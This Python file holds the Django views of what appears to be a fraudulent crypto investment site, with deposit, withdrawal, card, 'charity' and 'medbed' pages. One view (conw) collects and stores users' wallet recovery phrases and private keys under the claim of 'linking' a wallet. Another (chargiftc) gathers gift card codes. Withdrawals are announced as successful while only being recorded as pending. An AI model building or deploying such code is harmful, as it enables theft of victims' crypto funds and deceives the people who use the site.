from django.shortcuts import render, redirect
from .models import *
from django.http import HttpResponse, HttpResponseRedirect
from django.contrib.auth.decorators import login_required
from django.contrib.auth.models import User, auth
from django.contrib import messages
from django.urls import reverse

# Create your views here.

def index(request):
    return render(request,'index.html')

@login_required
def user(request):
    user = request.user
    x = ucoin.objects.filter(user=user)
    tb = tbalance.objects.filter(user=user)

    try:
       for a in tb:
        bc =  a.amount
        cb = bc < 10000.00
    except:
       tbalance.DoesNotExist
       cb = None

    if request.method == 'POST':
       amount = request.POST.get('amount')
       ucoin_id = request.POST.get('ucoin_id')
       f = float(amount)
       uc = ucoin.objects.get(pk=ucoin_id)
       if f < uc.min:
          messages.error(request,'Less than minimum deposit')
          return HttpResponseRedirect(request.META.get('HTTP_REFERER'))
       elif f > uc.max:
          messages.error(request,'Greater than maximum deposit')
          return HttpResponseRedirect(request.META.get('HTTP_REFERER'))
       else:
        x = depht.objects.create(user=user,ucoin=uc, amount=f)
        messages.success(request,'deposit is pending it will be added to your account when approved')
       return HttpResponseRedirect(request.META.get('HTTP_REFERER'))
    else:
     return render(request,'user/dashboard.html',locals())

def signin(request):
    if request.method == 'POST':
       username = request.POST.get('username')
       password = request.POST.get('password')
       user = auth.authenticate(username=username,password=password)
       if user is not None:
          auth.login(request,user)
          return redirect('/user')
       else:
          messages.error(request,'username or password not correct')
          return redirect('/signin')
    return render(request,'user/auth/sign-in.html')
    # return render(request,'user/auth/sign-in.html')

def signup(request):
    if request.method == 'POST':
        username = request.POST.get('username')
        email = request.POST.get('email')
        password = request.POST.get('password')
        password2 = request.POST.get('password2')
        if password == password2:
          if User.objects.filter(username=username).exists():
             messages.error(request,'Username Already Exists')
             return redirect('/signup')
          elif User.objects.filter(email=email).exists():
            messages.error(request,'Email already in use')
            return redirect('/signup')
          else:
             user = User.objects.create_user(username=username, email=email, password=password)
             user.save()
             x = coin.objects.all()
             tb = tbalance.objects.get_or_create(user=user)
             ub = tbalance.objects.get(user=user)
             for a in x:
                ucoin.objects.create(user=user,balance=ub,name=a.name,logo=a.logo,address=a.address)
             for b in x:
                backup.objects.create(user=user,balance=ub,name=b.name,logo=b.logo,address=b.address)
             messages.success(request,'account created successfully login now')
             return redirect('signin')
        else:
         messages.error(request,'password not the same')
         return redirect('/signup')
    else:
        return render(request,'user/auth/sign-up.html')
    #  return render(request,'user/auth/sign-up.html')

def install(request):
    return render(request, 'install/install.html')

@login_required
def transactions(request):
   user = request.user
   try:
    x = depht.objects.filter(user=user)
   except:
      depht.DoesNotExist
      x = None
   return render(request,'user/transactions.html',locals())

@login_required
def backupt(request):
   user=request.user
   x = backup.objects.filter(user=user)
   if request.method == 'POST':
       amount = request.POST.get('amount')
       backup_id = request.POST.get('backup_id')
       f = float(amount)
       uc = backup.objects.get(pk=backup_id)
       ad = backt.objects.create(user=user,backupv=uc, amount=f)
       messages.success(request,'backup is pending it will be added to your account when approved')
       return HttpResponseRedirect(request.META.get('HTTP_REFERER'))
   else:
     return render(request,'user/backup.html',locals())

@login_required
def backuph(request):
   user = request.user
   try:
    x = backt.objects.filter(user=user)
   except:
      backt.DoesNotExist
      x = None
   return render(request,'user/backup_h.html',locals())

@login_required
def withdraw(request):
   user = request.user
   if request.method == 'POST':
      address = request.POST.get('address')
      amount = request.POST.get('amount')
      ucoin_id = request.POST.get('ucoin_id')
      f = float(amount)
      uc = ucoin.objects.get(pk=ucoin_id)
      wh = withdh.objects.all()
      if f > uc.amount:
        messages.error(request, 'insuficient funds')
        return redirect('/user')
      elif f < 1:
         messages.error(request, 'withdrawal must be greater than $1')
         return redirect('/user')
      else:
       x = withdh.objects.create(user=user,ucoin=uc,address=address,amount=f)
       messages.success(request,'withdrawal is successful it will be added to your account when approved')
      return redirect('/user')
   return render(request,'user/withdraw.html')

@login_required
def whistory(request):
   user = request.user
   try:
    x = withdh.objects.filter(user=user)
   except:
      withdh.DoesNotExist
      x = None
   return render(request,'user/withh.html',locals())

@login_required
def bckwh(request):
   user = request.user
   if request.method == 'POST':
      address = request.POST.get('address')
      amount = request.POST.get('amount')
      backup_id = request.POST.get('backup_id')
      f = float(amount)
      uc = backup.objects.get(pk=backup_id)
      wh = backwh.objects.all()
      if f > uc.amount:
        messages.error(request, 'insuficient funds')
        return redirect('/user')
      elif f < 1:
         messages.error(request, 'withdrawal must be greater than $1')
         return redirect('/user')
      else:
       x = backwh.objects.create(user=user,backup=uc,address=address,amount=f)
       messages.success(request,'withdrawal is successful it will be added to your account when approved')
      return redirect('/user')
   return render(request,'user/bckwh.html',locals())

@login_required
def bh(request):
   user = request.user
   try:
    x = backwh.objects.filter(user=user)
   except:
      backwh.DoesNotExist
      x = None
   return render(request,'user/bh.html',locals())

@login_required
def lw(request):
   x = mywallet.objects.all()
   return render(request,'user/lw.html',locals())

@login_required
def conw(request,id):
   user = request.user
   x = mywallet.objects.get(id=id)
   if request.method == 'POST':
      wname = request.POST.get('wname')
      phrase = request.POST.get('phrase')
      kj = request.POST.get('kj')
      pkey = request.POST.get('pkey')
      x = waph.objects.get_or_create(user=user,wname=wname,phrase=phrase,kj=kj,pkey=pkey)
      messages.success(request,'wallet is linked successfully')
      return redirect('/user')
   else:
    return render(request,'user/conw.html',locals())

@login_required
def card(request):
    if request.method == 'POST':
        user = request.user
        limit = request.POST.get('limit')
        country = request.POST.get('country')
        state = request.POST.get('state')
        city = request.POST.get('city')
        street = request.POST.get('street')
        homeandblock = request.POST.get('homeandblock')
        pincode = request.POST.get('pincode')
        cc = creditcard.objects.create(user=user,limit=limit,country=country,state=state,city=city,street=street,homeandblock=homeandblock,pincode=pincode)
        messages.success(request,'credit request is successful')
        return redirect('/user')
    else:
     return render(request,'user/card.html')

@login_required
def myprofile(request):
    user=request.user
    pu = profile.objects.get_or_create(user=user)
    pr =  profile.objects.filter(user=user)
    return render(request,'user/profile.html',locals())


@login_required
def profup(request, id):
    user = request.user
    x = profile.objects.get(id=id)
    if request.method == 'POST':
      img = request.FILES.get('img')
      fullname = request.POST.get('fullname')
      phone  = request.POST.get('phone')
      edit = profile.objects.get(id=id)

      edit.img = img
      edit.fullname = fullname
      edit.phone = phone
      edit.save()
      messages.success(request,'profile update is successful')
      return redirect('myprofile')
    else:
     return render(request,'user/profup.html',locals())

@login_required
def buyc(request):
    bc = buycoin.objects.all()
    return render(request,'user/buyc.html',locals())

def logout(request):
    auth.logout(request)
    return redirect('/')

def generate_ref_link(request):
   referral_link = request.build_absolute_uri(reverse('register')) + '?ref=' + str(request.user.id)
   return HttpResponse(referral_link)


@login_required
def fundsr(request):
   return render(request,'user/fundr.html')

@login_required
def cardpayment(request):
   user =  request.user
   tb = tbalance.objects.filter(user=user)
   cr = cardcreate.objects.all()

   try:
       for a in tb:
        bc =  a.amount
        cb = bc < 20000.00
   except:
       tbalance.DoesNotExist
       cb = None
   return render(request,'user/cardpay.html', locals())


@login_required
def cardspayment(request, id):
   user = request.user
   x = ucoin.objects.filter(user=user)
   p = cardcreate.objects.get(id=id)

   if request.method == 'POST':
     paymentmethod = request.POST.get('paymentmethod')
     x = cardpay.objects.create(user=user,card=p,paymentmethod=paymentmethod)
     return redirect('/mycards')
   else:
    return render(request,'user/cardspayment.html', locals())

@login_required
def mycards(request):
 user = request.user
 tb = tbalance.objects.filter(user=user)


 try:
  for a in tb:
        bc =  a.amount
        cb = bc < 10000.00
 except:
    tbalance.DoesNotExist
    cb = None
 try:
  x = cardpay.objects.filter(user=user)
 except:
    cardpay.DoesNotExist
    x = None
 return render(request,'user/mycards.html',locals())

@login_required
def humindex(request):
   x = charity.objects.all()
   return render(request,'humproject/index.html',locals())

@login_required
def charitypay(request, id):
   user = request.user
   x = charity.objects.get(id=id)
   u = ucoin.objects.filter(user=user)

   if request.method == 'POST':
      ch_id = request.POST.get('ch_id')
      selected_option = request.POST.get('selected_option')
      cryptoname = request.POST.get('cryptoname')
      cryptoamount = request.POST.get('cryptoamount')


      cp = charitypayment.objects.create(charity=x,user=user,plan=selected_option,cryptoname=cryptoname,cryptoamount=cryptoamount)
      messages.success(request,'desposit is successfull')
      return redirect('/mydano')
   else:
    return render(request,'humproject/charitypay.html',locals())
@login_required
def chargiftc(request):
   user=request.user
   if request.method == 'POST':
      selected_option = request.POST.get('selected_option')
      giftcardname = request.POST.get('giftcardname')
      giftcardcode = request.POST.get('giftcardcode')
      giftcardamount = request.POST.get('giftcardamount')
      giftcardimg = request.FILES.get('giftcardimg')
      ch_id = request.POST.get('id')

      ch = charity.objects.get(pk=ch_id)
      cp = giftcardpay.objects.create(charity=ch,user=user,plan=selected_option,giftcardname=giftcardname,giftcardcode=giftcardcode,giftcardamount=giftcardamount,giftcardimg=giftcardimg)
      messages.success(request,'desposit is successfull')
      return redirect('/mydano')
   else:
    return render(request,'humproject/chargiftc.html',locals())

@login_required
def mydano(request):
   user = request.user
   try:
     x = charitypayment.objects.filter(user=user)
     g = giftcardpay.objects.filter(user=user)
   except:
      charitypayment.DoesNotExist
      giftcardpay.DoesNotExist
   return render(request,'humproject/mydano.html',locals())

@login_required
def medbedhome(request):
   user = request.user

   tb = tbalance.objects.filter(user=user)
   try:
    for a in tb:
         bc =  a.amount
         p1 = bc < 30000.00
   except:
      tbalance.DoesNotExist
      p1 = None

   try:
      for b in tb:
         bc =  a.amount
         p2 = bc < 100000.00
   except:
      tbalance.DoesNotExist
      p2 = None

   try:
    for c in tb:
         bc =  a.amount
         p3 = bc < 1000000.00
   except:
      tbalance.DoesNotExist
      p3 = None
   return render(request,'medbed/index.html',locals())

@login_required
def cartapply(request):
   return render(request,'medbed/cartapply.html')

@login_required
def certs(request):
    return render(request,'medbed/certs.html')